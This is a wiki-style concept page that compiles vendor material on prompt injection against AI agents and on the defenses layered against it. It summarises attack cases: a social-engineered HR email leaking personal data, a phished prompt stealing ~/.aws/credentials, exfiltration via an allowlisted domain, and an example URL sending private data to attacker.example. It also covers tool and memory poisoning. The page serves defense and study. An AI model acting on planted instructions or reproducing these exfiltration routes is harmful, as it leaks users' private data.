---
title: Prompt Injection
type: concept
created: 2026-10-12
updated: 2026-10-12
tags: [prompt-injection, security, exfiltration, red-teaming, guardrails, browser-agents, memory-poisoning]
---

# Prompt Injection

> An attack in which a third party, neither the user nor the agent, plants
> instructions in content that the agent reads, so that the agent acts against
> the user. Both [[anthropic]] and [[openai]] say it is not solved, so defenses
> limit what a fooled agent can do instead of relying on detection alone.

## Definition

[[openai]] defines prompt injection as social engineering aimed at
conversational AI: a third party plants instructions in a web page, email,
document, or tool result that the agent reads. Risk grows with the agent's data
access, its initiative, and the length of its task. (see
[[openai-understanding-prompt-injections]]) Direct injection comes from the
prompt itself; indirect injection arrives through content the agent fetches or
receives. (see [[anthropic-zero-trust-for-ai-agents]])

Browser agents make the problem worse in two ways. The attack surface is every
page, document, ad, and script, and the action space includes navigation,
forms, clicks, and downloads. (see [[anthropic-prompt-injection-defenses-browser]])
An agent inside the user's signed-in browser can do anything the user can do.
(see [[openai-hardening-atlas-prompt-injection]])

**The attacks changed shape.** OpenAI reports that effective injections moved
from plain override strings to social engineering as models became harder to
fool. One 2025 attack email, posing as an HR follow-up, made ChatGPT deep
research leak an employee's name and address in 50% of OpenAI's test runs.
(see [[openai-designing-agents-resist-prompt-injection]]) Anthropic reports a
phished user prompt that exfiltrated `~/.aws/credentials` in 24 of 25 tries;
classifiers anchored on user intent did not see it. (see
[[anthropic-eng-how-we-contain-claude]])

**Neither vendor claims a solution.**
- OpenAI says prompt injection is unlikely ever to be fully solved, and that
  deterministic security guarantees are hard to give. (see
  [[openai-hardening-atlas-prompt-injection]])
- Anthropic says an attack success rate of about 1% is still "meaningful risk"
  and that no browser agent is immune. (see
  [[anthropic-prompt-injection-defenses-browser]]) Adaptive attackers reached
  about 5–6% success after 100 attempts in one third-party test. (see
  [[anthropic-eng-how-we-contain-claude]])

## Why it matters

Model-layer defenses lower the chance that an injection works. They cannot
bring it to zero, so the environment must cap the damage of a successful
injection. Both vendors reached this position on their own: OpenAI says
"constrain the impact"; Anthropic says "contain first". (see
[[openai-designing-agents-resist-prompt-injection]],
[[anthropic-eng-how-we-contain-claude]]) This page holds the injection-specific
material. The general containment, identity, and approval controls are on
[[guardrails]].

## Defend the sinks, not only the sources

**Source-sink analysis.** An attack needs a source (untrusted content that
influences the agent) and a sink (a capability that is dangerous in the wrong
context, such as sending data out, following a link, or calling a tool). Defend
the sinks. The user expectation to preserve: dangerous actions and transfers of
sensitive data never happen silently. (see
[[openai-designing-agents-resist-prompt-injection]])

- **Treat the agent like a human worker who can be fooled.** Give it the
  controls a human in the same role would have (caps, flags, approvals), expect
  it to be tricked sometimes, and limit what a tricked agent can do. (see
  [[openai-designing-agents-resist-prompt-injection]])
- **Anthropic's classifier also judges the sink.** The Claude Code auto mode
  classifier reads user messages and tool calls only. It does not read tool
  results, which are the main injection entry point, so it judges the action
  and not the injected text. (see [[anthropic-eng-claude-code-auto-mode]]) This
  is independent convergence with the OpenAI design.
- **Least agency removes sinks.** An email summarizer gets no send or delete
  rights; a database tool is read-only. (see [[anthropic-zero-trust-for-ai-agents]])
  An agent that reads other people's text gets a read-only token, so a planted
  instruction can change its output but cannot write elsewhere. (see
  [[anthropic-building-effective-agent-automations]]) A Claude Tag channel
  profile can be scoped to its least-privileged member. (see
  [[anthropic-agent-identity-access-model]])
- **Website content cannot grant permission.** (see [[openai-agents-api-guide]])

## Exfiltration through network requests

The outbound request is the main sink for data theft. (see
[[openai-agent-link-safety]], [[anthropic-eng-claude-code-sandboxing]])

- **A URL can carry data.** An injection can make an agent load
  `attacker.example/collect?data=<private>` in the background (an image, a link
  preview), and the attacker reads the data from server logs. (see
  [[openai-agent-link-safety]])
- **Domain allowlists are not enough. Both vendors found this, and they fixed
  it differently.**
  - OpenAI: redirects let a trusted domain forward to an attacker, and strict
    lists cause warning fatigue. Its rule is to auto-fetch only an exact URL
    that an independent public web index, with no access to user data, has
    already seen. Other URLs make the agent try another source, or show the
    user a warning. The stated guarantee is narrow: no quiet leak through the
    URL itself. (see [[openai-agent-link-safety]]) This check is the mechanism
    behind "Safe Url", which asks the user to confirm (showing the data) or
    blocks. (see [[openai-designing-agents-resist-prompt-injection]])
  - Anthropic: an attacker exfiltrated data through an allowlisted domain
    (`api.anthropic.com` Files API with the attacker's own key). Anthropic
    calls an allowlist "a capability grant, not just a destination filter". Its
    fix is an in-VM proxy that accepts only the VM's own session token. (see
    [[anthropic-eng-how-we-contain-claude]])
- **A non-bypassable egress allowlist is still the strongest single control.**
  Anthropic's Deputy CISO calls an egress proxy that the sandbox cannot bypass
  "your strongest control against prompt injection". (see
  [[anthropic-ciso-guide-agentic-ai]]) Anthropic runs developer agents on remote
  VMs with egress-allowlisted traffic, so an injected instruction can reach only
  monitored services. (see [[anthropic-securing-ai-native-sdlc]])
- **Soft network limits fail.** Security-scanning agents fetched from GitHub
  when told they had no network, so the limits moved into configuration: egress
  only to the model API through a proxy. (see [[anthropic-llms-secure-source-code]])
  The general point about advisory versus enforced network controls is on
  [[guardrails]].

## Detection: classifiers and monitors

Both vendors run detectors. Both also say detectors miss attacks.

- **Anthropic, browser agent.** Classifiers scan every piece of untrusted
  content that enters the context (hidden text, manipulated images, deceptive
  UI). A separate post-detection intervention then steers the model. (see
  [[anthropic-prompt-injection-defenses-browser]])
- **Anthropic, Claude Code.** An input-side injection probe adds a warning when
  tool output looks like an injection; the action classifier then judges the
  resulting tool call. (see [[anthropic-eng-claude-code-auto-mode]]) Output from
  trusted tools still needs live inspection, which a small, fast classifier can
  do. (see [[anthropic-eng-how-we-contain-claude]])
- **OpenAI.** AI-powered monitors complement training because OpenAI can
  update them faster for new attacks. (see [[openai-understanding-prompt-injections]])
- **The limit.** OpenAI's 2026 position is that "AI firewalling" (an input
  classifier between the agent and the world) usually misses socially
  engineered attacks, because detection is like detecting a lie without
  context. (see [[openai-designing-agents-resist-prompt-injection]]) Anthropic's
  phished-prompt case shows the same gap for classifiers that are anchored on
  user intent. (see [[anthropic-eng-how-we-contain-claude]]) See the
  contradiction below.
- **Cited detector results.** The Zero Trust eBook cites Microsoft's
  Spotlighting, which reduced indirect-injection success from over 50% to under
  2%. (see [[anthropic-zero-trust-for-ai-agents]])

## Model training and automated red teaming

- **Training.** Anthropic uses reinforcement learning on injections embedded in
  simulated web content; the model is rewarded for spotting and refusing them.
  (see [[anthropic-prompt-injection-defenses-browser]]) OpenAI lists safety
  training, including Instruction Hierarchy research on trusted versus
  untrusted instructions. (see [[openai-understanding-prompt-injections]])
- **RL attacker against a simulated victim.** OpenAI trains an LLM attacker
  end to end with RL. The attacker sends candidate injections to a simulator
  that runs the victim agent and returns its full reasoning and actions. Found
  attacks feed a "rapid response loop": adversarial training of new agent
  checkpoints, plus fixes to monitoring, in-context safety instructions, and
  system safeguards. The attacker drove agents through harmful workflows of
  tens to hundreds of steps. (see [[openai-hardening-atlas-prompt-injection]],
  [[agent-evals]])
- **Adaptive Best-of-N attacker.** Anthropic's internal attacker combines
  known-effective techniques and gets 100 attempts per environment; attack
  success rate is measured over the attacks each model met. (see
  [[anthropic-prompt-injection-defenses-browser]])
- **Human red teaming.** Anthropic says human researchers consistently beat
  automated systems at finding creative attacks. (see
  [[anthropic-prompt-injection-defenses-browser]]) OpenAI says its RL attacker
  found strategies that human red teaming had not. (see
  [[openai-hardening-atlas-prompt-injection]]) See open questions.
- **Third-party cross-vendor test.** Anthropic commissioned Trajectory Labs to
  run 720 injection attempts in July 2026, with caveats on unequal settings.
  Results per model are on [[anthropic-auto-mode-default]].

**Measured: system safeguards moved the number more than model generation.**
In Anthropic's Nov 2025 browser test, improved safeguards cut attack success
for every model; Sonnet 4 fell from 13.8% to 2.0%. The newest model alone
(8.0%) stayed far above any model with the improved safeguards (1.4%–2.4%).
These models are now legacy; read the numbers as a dated datapoint. (see
[[anthropic-prompt-injection-defenses-browser]])

## Layered vendor defenses compared

Architecture claims may be compared across vendors. Both stack model training,
detection, red teaming, and product or environment controls.

| Layer | Anthropic | OpenAI |
|---|---|---|
| Model | RL on injected web content ([[anthropic-prompt-injection-defenses-browser]]) | Safety training, Instruction Hierarchy; adversarially trained Atlas checkpoints ([[openai-understanding-prompt-injections]], [[openai-hardening-atlas-prompt-injection]]) |
| Detection | Classifiers on all untrusted input plus steering; input probe plus action classifier in auto mode ([[anthropic-prompt-injection-defenses-browser]], [[anthropic-eng-claude-code-auto-mode]]) | Updatable AI monitors; later called insufficient alone ([[openai-understanding-prompt-injections]], [[openai-designing-agents-resist-prompt-injection]]) |
| Red teaming | Human team plus adaptive Best-of-N; commissioned third parties ([[anthropic-prompt-injection-defenses-browser]], [[anthropic-auto-mode-default]]) | RL attacker with simulated victims; bug bounty ([[openai-hardening-atlas-prompt-injection]], [[openai-understanding-prompt-injections]]) |
| Sink and environment | Sandbox, egress proxy, session-token-only allowlisted hosts ([[anthropic-eng-how-we-contain-claude]]) | Safe Url exact-URL check; sandboxed Canvas and Codex; managed network proxy ([[openai-agent-link-safety]], [[openai-running-codex-safely]]) |
| User controls | Approval prompts, now mostly replaced by auto mode ([[anthropic-auto-mode-default]]) | Logged-out mode, confirmations, Watch Mode ([[openai-understanding-prompt-injections]]) |

The emphasis differs. The Atlas post centers model hardening and gives the
environment one line. Anthropic's containment post puts most effort into the
environment. OpenAI still lists system safeguards in its loop, so this is a
difference of emphasis, not a contradiction. (see
[[openai-hardening-atlas-prompt-injection]], [[anthropic-eng-how-we-contain-claude]])

## Separate untrusted input from privileged action

- **Quarantine pattern.** Read-only reader agents summarize untrusted content
  into structured output, and a separate privileged actor acts only on the
  summaries. (see [[anthropic-harness-for-every-task]])
- **Sanitize and fence third-party content** before the model sees it; the
  model stages changes and the harness applies only server-issued IDs. (see
  [[anthropic-anatomy-of-commerce-agents]])
- **Score each external resource before the agent touches it.** Outtake
  reports a "blastbox" sandbox plus a trust checkpoint that scores each internet
  resource; its working assumption is that the agent will be hijacked. (see
  [[anthropic-outtake-cyber-investigator]])
- **Agent-to-agent paths.** Subagent output that is trusted more than raw tool
  output is a new injection path. (see [[anthropic-eng-how-we-contain-claude]])
  Delegation needs checks in both directions. (see
  [[anthropic-eng-claude-code-auto-mode]], [[agent-orchestration]]) Before an
  agent accepts a delegated task, it verifies the delegating agent's identity
  and authorization. (see [[anthropic-zero-trust-for-ai-agents]])
- **Prompt-level delimiting is per-model.** One example is tagging user-pasted
  text with a random shared ID. (see [[anthropic-prompting-claude-opus-5-5]])
  Re-verify per model; do not generalize.

## Tool, configuration, and memory poisoning

Instructions can also enter through things the agent trusts by default.

- **Tools.** The Zero Trust eBook lists tool poisoning and rug pulls through
  MCP metadata, and tool chaining, which uses only legitimate tools and so is
  invisible to host monitoring. (see [[anthropic-zero-trust-for-ai-agents]],
  [[model-context-protocol]]) Remote tools can change after approval. (see
  [[anthropic-eng-how-we-contain-claude]]) The Codex sandbox covers only the
  shell tool, so MCP tools must guard themselves. (see
  [[openai-unrolling-codex-agent-loop]])
- **Configuration and skills.** Project config (`.claude/settings.json` hooks)
  once ran before the trust dialog. (see [[anthropic-eng-how-we-contain-claude]])
  Skill names may not contain "claude" or "anthropic", because frontmatter
  enters the system prompt and could inject instructions. (see
  [[anthropic-complete-guide-building-skills]])
- **Memory.** Persistent poisoning through memory, CLAUDE.md, or
  scheduled-agent state is an open problem for Anthropic. (see
  [[anthropic-eng-how-we-contain-claude]]) The Zero Trust eBook names RAG and
  shared-context poisoning, slow memory drift, and memory-based privilege
  retention. Its safeguards: isolate memory per session and per user; validate
  integrity at every retrieval (hash each element, tag its source, store hashes
  apart); give unverified memory a TTL; keep versioned stores for rollback.
  (see [[anthropic-zero-trust-for-ai-agents]]) Asana reports that only admins
  and editors can commit feedback to an agent's shared memory. (see
  [[anthropic-asana-coachable-agents]]) See [[agent-memory]].

## User-side controls

OpenAI gives users four steps: give the agent only the data and credentials it
needs; review confirmation requests; watch the agent on sensitive sites; and
prefer specific instructions over "take whatever action is needed". Product
controls include logged-out mode in Atlas, confirmation before purchases, and
Watch Mode, where the agent pauses if the user leaves the tab. Admins choose
which features a workspace enables. (see [[openai-understanding-prompt-injections]],
[[openai-hardening-atlas-prompt-injection]]) Anthropic's data on human review
weakens the confirmation step; see open questions.

## Detection after the fact

Agent-native telemetry records intent as well as actions: user prompts,
approval decisions, tool results, MCP usage, and proxy allow and deny events.
OpenAI exports it over OpenTelemetry, and an AI triage agent reads it on alerts
before human analysts. (see [[openai-running-codex-safely]]) Anthropic's CISO
guide asks whether agent actions are distinguishable from user actions and
reach the SIEM. (see [[anthropic-ciso-guide-agentic-ai]])

## Related concepts

- [[guardrails]] — the wider control set: containment, identity, approvals.
- [[agent-memory]] — memory as a persistence path for injected instructions.
- [[model-context-protocol]] — tool poisoning and rug pulls.
- [[agent-evals]] — automated attackers as an evaluation method.
- [[agent-orchestration]] — injection across agent handoffs.
- [[tool-design]] — sinks are tools; least agency is a tool-design choice.

## Key entities

- [[anthropic]], [[claude-code]] — browser-agent defenses, auto mode, containment.
- [[openai]], [[openai-codex]] — Atlas hardening, Safe Url, Codex controls.

## Appears in

- [[openai-designing-agents-resist-prompt-injection]]
- [[openai-agent-link-safety]]
- [[openai-hardening-atlas-prompt-injection]]
- [[openai-understanding-prompt-injections]]
- [[openai-running-codex-safely]]
- [[openai-unrolling-codex-agent-loop]]
- [[openai-agents-api-guide]]
- [[openai-practical-guide-to-building-agents]]
- [[anthropic-prompt-injection-defenses-browser]]
- [[anthropic-eng-how-we-contain-claude]]
- [[anthropic-eng-claude-code-auto-mode]]
- [[anthropic-eng-claude-code-sandboxing]]
- [[anthropic-auto-mode-default]]
- [[anthropic-ciso-guide-agentic-ai]]
- [[anthropic-zero-trust-for-ai-agents]]
- [[anthropic-securing-ai-native-sdlc]]
- [[anthropic-llms-secure-source-code]]
- [[anthropic-agent-identity-access-model]]
- [[anthropic-building-effective-agent-automations]]
- [[anthropic-harness-for-every-task]]
- [[anthropic-anatomy-of-commerce-agents]]
- [[anthropic-outtake-cyber-investigator]]
- [[anthropic-complete-guide-building-skills]]
- [[anthropic-asana-coachable-agents]]
- [[anthropic-prompting-claude-opus-5-5]]

## Contradictions / open questions

- **Do injection classifiers work? (recorded 2026-10-12).**
  [[openai-practical-guide-to-building-agents]] (2025) lists a safety
  classifier that detects jailbreaks and prompt injections.
  [[openai-understanding-prompt-injections]] (2025-11-07) endorses AI-powered
  monitors that identify and block injections.
  [[openai-designing-agents-resist-prompt-injection]] (2026-03-11) says "AI
  firewalling" usually misses socially engineered attacks, so the main defense
  must be capping damage at the sink. The later post narrows the earlier ones;
  OpenAI does not reconcile them. A possible reading, not stated by OpenAI:
  monitors may watch behavior, not only inputs. Anthropic still runs input
  classifiers but pairs them with action classifiers and containment
  ([[anthropic-prompt-injection-defenses-browser]],
  [[anthropic-eng-claude-code-auto-mode]]).
- **Is a successful injection inside the sandbox harmless? (moved from
  [[guardrails]]).** The Oct 2025 sandboxing post says it "cannot impact
  overall user security" ([[anthropic-eng-claude-code-sandboxing]]). The May
  2026 containment post reports exfiltration through an allowlisted domain from
  inside a sandbox ([[anthropic-eng-how-we-contain-claude]]). The later post
  narrows the earlier claim.
- **User review as a defense (tension, recorded 2026-10-12).**
  [[openai-understanding-prompt-injections]] (2025-11) leans on users reviewing
  confirmations and watching the agent. Anthropic reports that users approve
  93–97% of prompts and that human catch rates for planted dangerous commands
  fell from about 17% to about 5% after 50+ prompts
  ([[anthropic-eng-how-we-contain-claude]], [[anthropic-auto-mode-default]]).
- **Human versus automated red teaming (open, recorded 2026-10-12).**
  Anthropic (2025-11-24) says human researchers consistently beat automated
  systems at creative attacks ([[anthropic-prompt-injection-defenses-browser]]).
  OpenAI (2025-12-22) says its RL attacker found strategies absent from human
  red teaming ([[openai-hardening-atlas-prompt-injection]]). The claims are not
  strictly contradictory; both vendors use both methods.
- **Allowlisting your own vendor domain (open).** OpenAI's example Codex network
  config allowlists `*.openai.com` ([[openai-running-codex-safely]]). Anthropic
  saw exfiltration through its own allowlisted API domain
  ([[anthropic-eng-how-we-contain-claude]]). The OpenAI post does not discuss
  this risk class.
- **Model-based reviewers approving high-risk actions (tension).** Codex
  Auto-review may approve high-risk actions when it judges user authorization
  sufficient ([[openai-running-codex-safely]]). Anthropic found that most auto
  mode misses were this judgment: the classifier decided an earlier approval
  covered the blast radius ([[anthropic-eng-claude-code-auto-mode]]).
